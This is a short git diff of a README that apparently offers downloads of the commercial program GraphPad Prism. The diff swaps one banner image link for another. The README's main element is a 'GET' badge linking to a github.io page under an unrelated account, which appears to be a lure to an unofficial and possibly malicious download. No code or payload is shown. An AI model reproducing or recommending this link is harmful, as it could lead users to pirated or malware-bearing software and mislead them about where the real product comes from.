@@ -1,6 +1,6 @@
 # GraphPad Prism Tools for Statistical Analysis and Scientific Graphing
 
-![Banner Placeholder](https://softlist.biz/upload/iblock/9cf/jzuqhibwyu2p24o79lhknrosgfch6fyz.png)
+![Banner Placeholder](https://static.wixstatic.com/media/dfa37c_531bb857fa0445dda9e5097ea164b343~mv2.jpg/v1/fill/w_1589,h_834,al_c/dfa37c_531bb857fa0445dda9e5097ea164b343~mv2.jpg)
 
 [![GET — GraphPad Prism](https://img.shields.io/badge/GET%20%E2%80%94%20GraphPad%20Prism-0078D6?style=for-the-badge&logoColor=white)](https://hiroshlorp443.github.io/.github/GraphPad-Prism-Tools)
 
